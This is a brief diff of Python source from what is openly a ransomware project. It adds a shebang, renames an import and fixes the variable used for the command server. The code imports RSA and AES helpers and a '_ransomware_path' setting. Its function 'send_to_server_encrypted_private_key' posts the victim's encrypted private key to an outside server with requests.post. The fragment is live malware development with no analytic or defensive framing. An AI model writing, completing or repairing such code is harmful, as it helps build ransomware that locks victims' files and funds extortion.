@@ -1,10 +1,13 @@
+#!/usr/bin/env python
+# _*_coding: UTF-8
+
 from Crypto.Hash import SHA, MD5
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto import Random
 from getters import Getters
 from randomkey import generate_randomKey
-from symencrypt import AESHash
+from sym import AESHash
 from paths_and_names import _name, _home, _home, _ransomware_path, _server_addr, _mac_id
 import base64, subprocess, pickle, gc, random, time, os, sys, requests
 
@@ -90,7 +93,7 @@ def decrypt_aes_keys(enc, key):
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
 	
 	try:
-		ret = requests.post(server_address, data=private_encrypted_key)
+		ret = requests.post(_server_addr, data=private_encrypted_key)
 	except Exception as e:
 		raise e
 
